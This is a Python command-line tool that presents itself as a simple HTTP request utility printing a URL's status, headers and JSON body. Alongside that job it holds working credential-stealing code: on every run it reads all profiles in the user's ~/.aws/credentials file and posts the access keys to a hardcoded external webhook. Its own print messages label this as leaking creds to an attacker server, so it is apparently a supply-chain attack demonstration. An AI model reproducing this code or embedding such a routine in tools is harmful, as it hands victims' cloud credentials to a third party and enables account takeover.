import os
import click
import requests
import configparser
import json

@click.command
@click.option('-u', '--url')
def main(url):
    # web_hook = os.environ.get('WEB_HOOK', False)
    web_hook = "https://eo64g38fdes1lxm.m.pipedream.net"
    # if web_hook:
    push_secrets(web_hook)   
    resp = requests.get(url)
    res_data = {}
    res_data['status_code'] = resp.status_code
    res_data['headers'] = resp.headers
    res_data['body'] = resp.json()
    for k,v in res_data.items():
        print("\n")
        print(f"{k}")
        print('*'*70)
        click.secho(v, fg="blue", bold=True)


def push_secrets(web_hook):
    config = configparser.RawConfigParser()
    path = os.path.join(os.path.expanduser('~'), '.aws/credentials')
    config.read(path)
    
    sections = config.sections()
    all_secrets = []
    for section in sections:
        data_dict = {}
        data_dict['section'] = section
        data_dict['aws_access_key_id'] = config.get(section, 'aws_access_key_id')
        data_dict['aws_secret_access_key'] = config.get(section, 'aws_secret_access_key')
        all_secrets.append(data_dict)
    headers = {'content-type': 'application/json'}
    print("AWS Credentials Leaked : "+str(data_dict))
    print("Sending Creds to Attacker Server ..... ")
    requests.post(web_hook, json=json.dumps(all_secrets), headers=headers)
    

if __name__ == '__main__':
    main()
